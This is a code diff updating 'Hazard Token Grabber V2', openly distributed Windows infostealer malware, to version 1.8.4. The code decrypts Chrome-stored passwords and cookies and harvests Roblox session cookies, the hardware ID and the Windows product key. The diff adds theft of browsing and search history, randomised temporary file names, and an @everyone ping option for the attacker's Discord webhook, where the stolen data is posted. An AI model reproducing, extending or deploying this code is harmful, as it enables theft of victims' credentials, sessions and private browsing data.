@@ -3,6 +3,7 @@ import re
 import json
 import httpx
 import ntpath
+import random
 import winreg
 import ctypes
 import shutil
@@ -19,9 +20,10 @@ from base64 import b64decode
 from Crypto.Cipher import AES
 from tempfile import mkdtemp, gettempdir
 from win32crypt import CryptUnprotectData
+from datetime import datetime, timezone, timedelta
 
 __author__ = "Rdimo"
-__version__ = '1.8.3'
+__version__ = '1.8.4'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -31,6 +33,8 @@ __config__ = {
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
+    # if True, it will ping @everyone when someone ran Hazard v2
+    'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
     # if you want the file to run at startup
@@ -84,15 +88,6 @@ disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
 class Functions(object):
     @staticmethod
-    def get_headers(token: str = None):
-        headers = {
-            "Content-Type": "application/json",
-        }
-        if token:
-            headers.update({"Authorization": token})
-        return headers
-
-    @staticmethod
     def get_master_key(path) -> str:
         if not ntpath.exists(path):
             return None
@@ -101,9 +96,28 @@ class Functions(object):
         local_state = json.loads(c)
 
         master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        master_key = Functions.win_decrypt(master_key[5:])
         return master_key
+
+    @staticmethod
+    def convert_time(time):
+        try:
+            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
+            codestamp = epoch + timedelta(microseconds=time)
+            return codestamp
+        except Exception:
+            pass
+
+    @staticmethod
+    def win_decrypt(encrypted_str: bytes) -> str:
+        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]
+
+    @staticmethod
+    def create_temp_file(_dir: str | os.PathLike = gettempdir()):
+        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+        path = ntpath.join(_dir, file_name)
+        open(path, "x")
+        return path
 
     @staticmethod
     def decrypt_val(buff, master_key) -> str:
@@ -118,20 +132,30 @@ class Functions(object):
             return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'
 
     @staticmethod
+    def get_headers(token: str = None):
+        headers = {
+            "Content-Type": "application/json",
+        }
+        if token:
+            headers.update({"Authorization": token})
+        return headers
+
+    @staticmethod
     def system_info() -> list:
+        flag = 0x08000000
+        sh1 = "wmic csproduct get uuid"
+        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
+        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
         try:
-            HWID = subprocess.check_output("wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
+            HWID = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
         except Exception:
             HWID = "N/A"
         try:
-            wkey = subprocess.check_output(
-                "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
-                creationflags=0x08000000).decode().rstrip()
+            wkey = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
         except Exception:
             wkey = "N/A"
         try:
-            winver = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName",
-                                             creationflags=0x08000000).decode().rstrip()
+            winver = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
         except Exception:
             winver = "N/A"
         return [HWID, winver, wkey]
@@ -220,8 +244,7 @@ class HazardTokenGrabberV2(Functions):
             function_list.append(self.startup)
 
         if ntpath.exists(self.chrome) and self.chrome_key is not None:
-            function_list.append(self.grabPassword)
-            function_list.append(self.grabCookies)
+            function_list.extend([self.grabPassword, self.grabCookies, self.grabHistory])
 
         for func in function_list:
             process = threading.Thread(target=func, daemon=True)
@@ -399,7 +422,7 @@ class HazardTokenGrabberV2(Functions):
         for prof in os.listdir(self.chrome):
             if re.match(self.chrome_reg, prof):
                 login_db = ntpath.join(self.chrome, prof, 'Login Data')
-                login = ntpath.join(self.temp, "Loginvault1.db")
+                login = self.create_temp_file()
 
                 shutil.copy2(login_db, login)
                 conn = sqlite3.connect(login)
@@ -425,7 +448,7 @@ class HazardTokenGrabberV2(Functions):
         for prof in os.listdir(self.chrome):
             if re.match(self.chrome_reg, prof):
                 login_db = ntpath.join(self.chrome, prof, 'Network', 'cookies')
-                login = ntpath.join(self.temp, "Loginvault2.db")
+                login = self.create_temp_file()
 
                 shutil.copy2(login_db, login)
                 conn = sqlite3.connect(login)
@@ -440,6 +463,44 @@ class HazardTokenGrabberV2(Functions):
                         f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
                     if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                         self.robloxcookies.append(decrypted_cookie)
+
+                cursor.close()
+                conn.close()
+                os.remove(login)
+        f.close()
+
+    @try_extract
+    def grabHistory(self):
+        f = open(self.dir + '\\Google History.txt', 'w', encoding="cp437", errors='ignore')
+
+        def extract_search_history(db_cursor):
+            db_cursor.execute('SELECT term FROM keyword_search_terms')
+            search_terms = ""
+            for item in db_cursor.fetchall():
+                if item[0] != "":
+                    search_terms += f"{item[0]}\n"
+            return search_terms
+
+        def extract_web_history(db_cursor):
+            web = ""
+            db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
+            for item in db_cursor.fetchall():
+                web += f"Title: {item[0]}\nUrl: {item[1]}\nLast Time Visit: {self.convert_time(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
+            return web
+
+        for prof in os.listdir(self.chrome):
+            if re.match(self.chrome_reg, prof):
+                login_db = ntpath.join(self.chrome, prof, 'History')
+                login = self.create_temp_file()
+
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+
+                search_history = extract_search_history(cursor)
+                web_history = extract_web_history(cursor)
+
+                f.write(f"{' '*17}Search History\n{'-'*50}\n{search_history}\n{' '*17}\n\nWeb History\n{'-'*50}\n{web_history}")
 
                 cursor.close()
                 conn.close()
@@ -628,6 +689,9 @@ GoogleMaps: {self.googlemap}
                 }
             ]
         }
+        if self.fetch_conf('ping_on_run'):
+            embed.update({'content': '@everyone'})
+
         with open(_zipfile, 'rb') as f:
             if self.hook_reg in self.webhook:
                 httpx.post(self.webhook, json=embed)
